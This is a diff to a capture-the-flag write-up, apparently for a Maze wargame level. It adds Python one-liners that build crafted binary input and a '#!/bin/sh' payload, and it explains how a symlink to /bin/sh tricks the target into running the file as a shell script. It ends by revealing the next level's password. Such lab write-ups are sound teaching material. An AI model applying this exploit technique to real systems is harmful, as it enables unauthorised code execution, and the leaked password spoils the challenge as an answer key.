@@ -283,6 +283,20 @@ lets check the disassembly code.
 
 Debug the main function sequentially. You  will see interesting things from address 0x08048684.  First it pushes the parameter for read x34 is 52.  The it sets the buffer at ebp-0x38.
 
-(python -c 'print "ABCDEFG"+"\x01\x01"+"JKLMNOPQRSTUVWXYZab"+"\x20\x00\x00\x00"+"cdefghijklmn"+"\x01\x00\x00\x00"+"stuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"+"Z"*100') >temp
+(python -c 'print "ABCDEFG"+"\x01\x01"+"JKLMNOPQRSTUVWXYZab"+"\x20\x00\x00\x00"+"cdefghijklmn"+"\x01\x00\x00\x00"+"stuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"+"Z"*36') >temp
 
 set args /tmp/tomal_maze4/temp
+
+set args /tmp/tomal/temp
+
+```
+python -c 'print "#!/bin/sh" + "\x0a"+ "AAAAAAAAAAAAAAAAA" +"\x0a"+ "\x20\x00\x00\x00" + "B"*12 + "\xb8\x2e\x00\x00" +"B"*70'
+```
+
+We will have to change the permission of the AAAAAAAAAAAAAAAAA file to trigger the stat fucntion call. Create a symbolic link with /bin/sh. 
+
+The processor will treat the input file as a bash as we defines #!/bin/sh it the start of the file. So the processor with execute the next AAA... instruciton as bash command. We leverage from this by creating a symbolic link with /bin/sh.
+
+
+
+Password: **ishipaeroo**
